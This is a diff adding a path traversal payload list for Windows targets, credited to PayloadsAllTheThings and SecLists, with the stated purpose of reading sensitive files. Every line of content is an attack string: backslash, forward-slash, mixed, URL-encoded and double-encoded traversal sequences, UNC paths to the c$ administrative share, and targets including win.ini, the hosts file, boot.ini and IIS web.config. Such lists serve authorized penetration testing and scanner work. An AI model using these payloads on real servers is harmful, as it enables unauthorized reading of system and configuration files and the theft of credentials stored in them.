@@ -1,0 +1,44 @@
+# Path Traversal payloads — Windows targets
+# Source: PayloadsAllTheThings, SecLists/Fuzzing/LFI
+# Purpose: Read sensitive Windows files via directory traversal
+
+# Basic Windows traversal
+..\windows\win.ini
+..\..\windows\win.ini
+..\..\..\windows\win.ini
+..\..\..\..\windows\win.ini
+
+# Forward slash variants
+../windows/win.ini
+../../windows/win.ini
+../../../windows/win.ini
+../../../../windows/win.ini
+
+# Mixed separators
+..\../windows/win.ini
+..\..\../windows\win.ini
+
+# URL-encoded backslash
+..%5cwindows%5cwin.ini
+..%5c..%5cwindows%5cwin.ini
+..%5c..%5c..%5cwindows%5cwin.ini
+
+# Double URL-encoded
+..%255cwindows%255cwin.ini
+..%255c..%255cwindows%255cwin.ini
+
+# UNC path attempt
+\\127.0.0.1\c$\windows\win.ini
+\\localhost\c$\windows\win.ini
+
+# Common Windows target files
+..\windows\system.ini
+..\..\windows\system.ini
+..\windows\System32\drivers\etc\hosts
+..\..\windows\System32\drivers\etc\hosts
+..\boot.ini
+..\..\boot.ini
+../boot.ini
+../../boot.ini
+..\inetpub\wwwroot\web.config
+..\..\inetpub\wwwroot\web.config
